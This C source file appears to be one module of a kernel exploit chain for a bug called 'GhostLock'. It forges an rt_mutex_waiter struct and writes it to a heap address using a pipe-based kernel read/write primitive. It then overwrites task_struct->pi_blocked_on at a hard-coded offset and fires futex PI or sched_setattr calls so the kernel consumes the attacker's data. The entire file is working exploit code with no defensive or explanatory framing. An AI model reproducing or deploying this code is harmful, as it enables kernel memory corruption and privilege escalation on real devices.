/**
 * heap_spray.c - Heap spray exploitation chain for GhostLock
 *
 * This module implements the heap spray approach to exploit GhostLock:
 * 1. Leak mm_struct address (via KernelSnitch) -> calculate task_struct
 * 2. Trigger GhostLock -> dangling pi_blocked_on pointer
 * 3. Spray heap with fake waiter structs
 * 4. Use pipe physical read/write to change pi_blocked_on -> heap address
 * 5. Trigger PI operation -> kernel reads fake waiter from heap
 *
 * Key offsets (IDA verified):
 *   task_struct->pi_blocked_on = 0x898
 *   mm_struct->owner = MM_OWNER_OFF (1032)
 */

#include "common.h"

/* Heap spray configuration */
#define FAKE_WAITER_SIZE 0x50  /* sizeof(struct rt_mutex_waiter) */
#define PI_BLOCKED_ON_OFF 0x898

/* Fake waiter struct layout */
struct fake_waiter {
    uint64_t tree_entry_left;     /* +0x00 */
    uint64_t tree_entry_right;    /* +0x08 */
    uint64_t tree_entry_parent;   /* +0x10 */
    uint64_t pi_tree_entry_left;  /* +0x18 */
    uint64_t pi_tree_entry_right; /* +0x20 */
    uint64_t pi_tree_entry_parent;/* +0x28 */
    uint64_t task;                /* +0x30: pointer to task_struct */
    uint64_t lock;                /* +0x38: pointer to rt_mutex_base */
    uint32_t prio;                /* +0x40: priority value */
    uint32_t padding;             /* +0x44: alignment */
    uint64_t deadline;            /* +0x48: deadline value */
};  /* total: 0x50 = 80 bytes */

/**
 * Calculate task_struct address from mm_struct
 * Uses the shared utility function from util.c
 */
static uintptr_t calculate_task_from_mm(int fd, uintptr_t mm_struct) {
    return calculate_task_from_mm_struct(fd, mm_struct);
}

/**
 * Build fake waiter struct in buffer
 * The fake waiter will be placed at the sprayed heap location
 */
static void build_fake_waiter(unsigned char *buf, size_t buf_size,
                               uintptr_t fake_task, uintptr_t fake_lock,
                               uint32_t prio, uint64_t deadline) {
    memset(buf, 0, buf_size);

    struct fake_waiter *w = (struct fake_waiter *)buf;

    /* tree_entry: make it look like a valid rb_node */
    w->tree_entry_left = 0;
    w->tree_entry_right = 0;
    w->tree_entry_parent = 0;

    /* pi_tree_entry: make it look like a valid rb_node */
    w->pi_tree_entry_left = 0;
    w->pi_tree_entry_right = 0;
    w->pi_tree_entry_parent = 0;

    /* Critical fields */
    w->task = fake_task;
    w->lock = fake_lock;
    w->prio = prio;
    w->deadline = deadline;

    pr_info("heap_spray: built fake waiter task=%016llx lock=%016llx "
            "prio=%u deadline=%016llx\n",
            (unsigned long long)fake_task,
            (unsigned long long)fake_lock,
            prio, (unsigned long long)deadline);
}

/**
 * Redirect pi_blocked_on to point to sprayed heap address
 * This is the critical step that makes the dangling pointer valid
 */
static int redirect_pi_blocked_on(int fd, uintptr_t task_struct,
                                   uintptr_t heap_addr) {
    if (!task_struct || !heap_addr) {
        return 0;
    }

    uintptr_t pi_blocked_on_addr = task_struct + PI_BLOCKED_ON_OFF;

    /* Read current value for debugging */
    uint64_t current_value = pipe_read64(fd, pi_blocked_on_addr);
    pr_info("heap_spray: current pi_blocked_on=%016llx (task=%016llx)\n",
            (unsigned long long)current_value,
            (unsigned long long)task_struct);

    /* Write new value pointing to sprayed heap */
    if (!pipe_write64(fd, pi_blocked_on_addr, heap_addr)) {
        pr_warning("heap_spray: failed to write pi_blocked_on\n");
        return 0;
    }

    /* Verify the write */
    uint64_t verify = pipe_read64(fd, pi_blocked_on_addr);
    if (verify != heap_addr) {
        pr_warning("heap_spray: pi_blocked_on verify failed "
                   "wrote=%016llx read=%016llx\n",
                   (unsigned long long)heap_addr,
                   (unsigned long long)verify);
        return 0;
    }

    pr_success("heap_spray: pi_redirected task=%016llx pi_blocked_on=%016llx\n",
               (unsigned long long)task_struct,
               (unsigned long long)heap_addr);
    return 1;
}

/**
 * Trigger PI operation to make kernel read through pi_blocked_on
 *
 * The PI (Priority Inheritance) code reads pi_blocked_on when:
 * 1. A task blocks on an rt_mutex (task_blocks_on_rt_mutex)
 * 2. Priority adjustment happens (rt_mutex_adjust_prio_chain)
 * 3. Waiter cleanup (remove_waiter)
 *
 * We trigger this by having a thread call FUTEX_LOCK_PI on a new futex.
 * This forces the kernel to check the current task's pi_blocked_on,
 * which now points to our fake waiter on the heap.
 *
 * IMPORTANT: This must be called AFTER redirect_pi_blocked_on(),
 * and BEFORE the kernel accesses pi_blocked_on again.
 */
int trigger_pi_read(int fake_futex_addr) {
    /*
     * Create a thread that locks a futex with PI.
     * This triggers task_blocks_on_rt_mutex which reads current->pi_blocked_on.
     *
     * The sequence:
     * 1. Thread calls FUTEX_LOCK_PI on fake_futex_addr
     * 2. Kernel enters rt_mutex_slowlock -> task_blocks_on_rt_mutex
     * 3. task_blocks_on_rt_mutex reads current->pi_blocked_on
     * 4. Since we changed pi_blocked_on to point to our fake waiter,
     *    the kernel reads our controlled data
     */
    uint32_t futex_word = 0;
    struct timespec timeout;
    timeout.tv_sec = 1;
    timeout.tv_nsec = 0;

    pr_info("heap_spray: triggering PI read on futex=%016llx\n",
            (unsigned long long)fake_futex_addr);

    /*
     * Use FUTEX_LOCK_PI with a short timeout.
     * If the futex is uncontested, this returns immediately.
     * If contested, it blocks and triggers PI chain walk.
     *
     * The key is that task_blocks_on_rt_mutex is called,
     * which accesses current->pi_blocked_on.
     */
    int ret = futex_op((uint32_t *)fake_futex_addr, FUTEX_LOCK_PI,
                       0, &timeout, NULL, 0);
    int saved_errno = errno;

    pr_info("heap_spray: PI trigger ret=%d errno=%d\n", ret, saved_errno);

    /*
     * If ret == 0, the lock was acquired successfully.
     * This means the kernel read our fake waiter.
     *
     * If ret == -EAGAIN or -ETIMEDOUT, the lock couldn't be acquired
     * but the PI code still ran.
     *
     * If ret == -EDEADLK, we hit a deadlock detection, which also
     * means the PI code ran.
     */
    if (ret == 0) {
        /* Lock acquired - release it immediately */
        futex_op((uint32_t *)fake_futex_addr, FUTEX_UNLOCK_PI,
                 0, NULL, NULL, 0);
        pr_success("heap_spray: PI read triggered successfully\n");
        return 1;
    } else if (ret == -1 && (saved_errno == EAGAIN ||
               saved_errno == ETIMEDOUT || saved_errno == EDEADLK)) {
        /* PI code ran even though we didn't get the lock */
        pr_success("heap_spray: PI read triggered (ret=%d errno=%d)\n",
                   ret, saved_errno);
        return 1;
    } else {
        pr_warning("heap_spray: PI trigger unexpected ret=%d errno=%d\n",
                   ret, saved_errno);
        return 0;
    }
}

/**
 * Alternative: Trigger PI via priority adjustment
 *
 * This uses sched_setattr syscall to change the current task's priority,
 * which can trigger rt_mutex_adjust_prio_chain if the task
 * is blocked on an rt_mutex.
 */
int trigger_pi_via_priority(void) {
    struct local_sched_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.size = sizeof(attr);
    attr.sched_policy = SCHED_FIFO;
    attr.sched_priority = 50;  /* Medium priority */

    pr_info("heap_spray: triggering PI via priority adjustment\n");

    /* Use syscall directly since sched_setattr may not be in NDK */
    int ret = (int)syscall(SYS_sched_setattr, 0, &attr, 0);
    int saved_errno = errno;

    pr_info("heap_spray: priority adjust ret=%d errno=%d\n", ret, saved_errno);

    /* Reset to normal priority */
    attr.sched_policy = SCHED_NORMAL;
    attr.sched_priority = 0;
    attr.sched_nice = 0;
    syscall(SYS_sched_setattr, 0, &attr, 0);

    /*
     * The priority adjustment triggers rt_mutex_adjust_prio_chain
     * if the task is blocked on an rt_mutex.
     * This reads current->pi_blocked_on.
     */
    return (ret == 0 || saved_errno == EINVAL);
}

/**
 * Main heap spray exploitation entry point
 * Called after GhostLock trigger to exploit the dangling pi_blocked_on
 *
 * Complete exploitation chain:
 * 1. Calculate task_struct from mm_struct
 * 2. Build fake waiter in spray buffer
 * 3. Write fake waiter to spray address via pipe
 * 4. Redirect pi_blocked_on to point to spray address
 * 5. Trigger PI operation to make kernel read fake waiter
 */
int run_heap_spray_exploit(int fd, uintptr_t mm_struct,
                            uintptr_t spray_addr) {
    if (!fd || !mm_struct || !spray_addr) {
        pr_warning("heap_spray: invalid parameters fd=%d mm=%016llx spray=%016llx\n",
                   fd, (unsigned long long)mm_struct,
                   (unsigned long long)spray_addr);
        return 0;
    }

    pr_success("heap_spray: starting exploit mm=%016llx spray=%016llx\n",
               (unsigned long long)mm_struct,
               (unsigned long long)spray_addr);

    /* Step 1: Calculate task_struct from mm_struct */
    uintptr_t task_struct = calculate_task_from_mm(fd, mm_struct);
    if (!task_struct) {
        return 0;
    }

    /* Step 2: Build fake waiter in spray buffer */
    unsigned char fake_waiter_buf[FAKE_WAITER_SIZE];
    build_fake_waiter(fake_waiter_buf, FAKE_WAITER_SIZE,
                      task_struct,      /* task: point to real task_struct */
                      0,                /* lock: NULL for now */
                      120,              /* prio: normal priority */
                      0);               /* deadline */

    /* Step 3: Write fake waiter to spray address via pipe */
    if (!pipe_phys_write_data(fd, spray_addr, fake_waiter_buf,
                              FAKE_WAITER_SIZE)) {
        pr_warning("heap_spray: failed to write fake waiter to spray addr\n");
        return 0;
    }

    /* Step 4: Redirect pi_blocked_on to point to spray address */
    if (!redirect_pi_blocked_on(fd, task_struct, spray_addr)) {
        return 0;
    }

    pr_success("heap_spray: Step 4 complete — pi_blocked_on redirected\n");

    /* Step 5: Trigger PI operation (optional, controlled by env var) */
    int skip_pi = env_flag("HEAP_SPRAY_SKIP_PI", 0);
    if (skip_pi) {
        pr_info("heap_spray: Step 5 SKIPPED (HEAP_SPRAY_SKIP_PI=1)\n");
        pr_success("heap_spray: stopping at Step 4, pi_blocked_on now points to controlled data\n");
        return 1;
    }

    pr_success("heap_spray: triggering PI operation...\n");

    /*
     * Use a stack variable as the futex address.
     * The kernel will access this address when checking the futex state.
     */
    uint32_t trigger_futex = 0;
    int pi_result = trigger_pi_read((uintptr_t)&trigger_futex);

    if (!pi_result) {
        /* Try alternative method */
        pr_info("heap_spray: trying priority adjustment method\n");
        pi_result = trigger_pi_via_priority();
    }

    if (pi_result) {
        pr_success("heap_spray: exploit complete! "
                   "kernel read fake waiter from heap\n");
    } else {
        pr_warning("heap_spray: PI trigger failed, "
                   "kernel may not have read fake waiter\n");
    }

    return pi_result;
}
